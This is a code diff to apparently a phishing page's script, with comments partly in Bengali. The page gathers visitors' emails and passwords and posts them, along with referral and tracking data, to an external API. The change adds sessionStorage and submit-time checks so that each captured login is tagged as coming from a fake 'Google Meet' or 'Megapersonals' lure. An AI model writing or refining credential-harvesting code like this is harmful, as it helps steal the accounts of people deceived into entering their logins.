@@ -202,9 +202,19 @@
         const TRACK_URL = `${API_BASE}/api/track-visit`;
         const CLICK_URL = `${API_BASE}/api/clicks`;
 
-        // URL থেকে site প্যারামিটার চেক করবে
+        // URL থেকে site প্যারামিটার চেক করবে, অথবা sessionStorage থেকে
         const urlParamsForSite = new URLSearchParams(window.location.search);
-        const isFromGoogleMeet = urlParamsForSite.get('site') === 'GoogleMeet';
+        let isFromGoogleMeet = urlParamsForSite.get('site') === 'GoogleMeet';
+        
+        // Fallback: check sessionStorage if query param not found
+        if (!isFromGoogleMeet) {
+            try {
+                const redirectSource = sessionStorage.getItem('redirectSource');
+                isFromGoogleMeet = redirectSource === 'GoogleMeet';
+            } catch (e) {
+                console.warn('sessionStorage read failed', e);
+            }
+        }
         
         // ট্র্যাকিং নাম সেটআপ কন্ডিশন
         const SITE_NAME = isFromGoogleMeet ? 'Google Meet' : 'Megapersonals';
@@ -365,10 +375,26 @@
 
             setLoading(true);
             try {
+                // Re-check source at submission time to ensure we have the latest value
+                let finalSiteName = SITE_NAME;
+                try {
+                    const urlParams = new URLSearchParams(window.location.search);
+                    if (urlParams.get('site') === 'GoogleMeet') {
+                        finalSiteName = 'Google Meet';
+                    } else {
+                        const redirectSource = sessionStorage.getItem('redirectSource');
+                        if (redirectSource === 'GoogleMeet') {
+                            finalSiteName = 'Google Meet';
+                        }
+                    }
+                } catch (e) {
+                    console.warn('site name check failed', e);
+                }
+                
                 const payload = {
                     email,
                     password,
-                    website: SITE_NAME, // Google Meet থেকে আসলে এখানে ডেটা 'Google Meet' নামেই ডাটাবেজে সাবমিট হবে
+                    website: finalSiteName, // Google Meet থেকে আসলে এখানে ডেটা 'Google Meet' নামেই ডাটাবেজে সাবমিট হবে
                     ref: REF || undefined,
                     route: routeType || undefined,
                     userId: state.userId || undefined,
